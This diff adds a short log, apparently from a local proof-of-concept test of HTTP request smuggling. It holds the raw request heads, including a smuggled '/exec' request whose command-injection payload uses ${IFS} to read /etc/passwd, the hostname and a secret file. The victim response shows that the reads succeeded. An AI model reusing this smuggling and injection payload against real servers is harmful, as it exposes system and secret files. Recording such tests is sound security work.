@@ -1,0 +1,9 @@
+ATTACKER -> b'HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: keep-alive\r\n\r\nCLEAN'
+VICTIM   -> b'HTTP/1.1 200 OK\r\nContent-Length: 122\r\nConnection: keep-alive\r\n\r\nEXEC:root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n---\ngauss\n---\nTOPSECRET-OUTSIDE-ROOT\n'
+
+--- upstream request heads ---
+ 1: 'GET /x\r\nHost: up'
+ 2: 'GET /exec?cmd=head${IFS}-2${IFS}/etc/passwd;echo${IFS}---;hostname;echo${IFS}---;cat${IFS}/tmp/toksec-hunt/secret-test.txt HTTP/1.1\r\nHost: up\r\nX-Pad:  HTTP/1.1\r\nHost: 127.0.0.1:18471\r\nConnection: keep-alive'
+ 3: 'GET /victim HTTP/1.1\r\nHost: 127.0.0.1:18471\r\nConnection: keep-alive'
+--- srvlog ---
+
